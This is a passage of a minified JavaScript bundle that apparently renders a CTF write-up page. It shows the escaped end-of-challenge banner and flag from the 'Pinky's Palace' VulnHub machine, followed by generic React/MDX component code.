|/ _` |/ __/ _ \\\r\n|  __/ (_| | | (_| | (_|  __/\r\n|_|   \\__,_|_|\\__,_|\\___\\___|\r\n\r\n[+] CONGRATS YOUVE PWND PINKYS PALACE!!!!!!\r\n[+] Flag: 2208f787fcc6433b4798d2189af7424d\r\n[+] Twitter: @Pink_P4nther\r\n[+] Cheers to VulnHub!\r\n[+] VM Host: VMware\r\n[+] Type: CTF || [Realistic]\r\n[+] Hopefully you enjoyed this and gained something from it as well!!!\n"})})]})}function d(n={}){const{wrapper:e}={...(0,t.R)(),...n.components};return e?(0,i.jsx)(e,{...n,children:(0,i.jsx)(o,{...n})}):o(n)}},28453:(n,e,r)=>{r.d(e,{R:()=>a,x:()=>l});var s=r(96540);const i={},t=s.createContext(i);function a(n){const e=s.useContext(t);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function l(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:a(n.components),s.createElement(t.Provider,{value:e},n.children)}}}]);